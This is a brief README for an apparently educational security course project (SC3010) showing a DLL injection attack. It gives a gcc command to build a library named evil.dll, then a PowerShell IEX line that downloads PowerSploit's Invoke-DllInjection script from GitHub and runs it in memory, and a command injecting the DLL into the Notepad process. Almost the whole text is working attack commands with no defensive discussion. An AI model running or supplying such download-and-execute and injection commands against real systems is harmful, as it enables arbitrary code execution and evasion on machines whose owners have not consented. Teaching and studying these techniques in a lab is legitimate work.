# SC3010 Project

The following codes are educational. 

To create DLL files 

`gcc -shared -o evil.dll dll.c`


To run exploit

```
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1')
Invoke-DllInjection -ProcessID $((Get-Process -Name Notepad).Id) -Dll evil.dll
```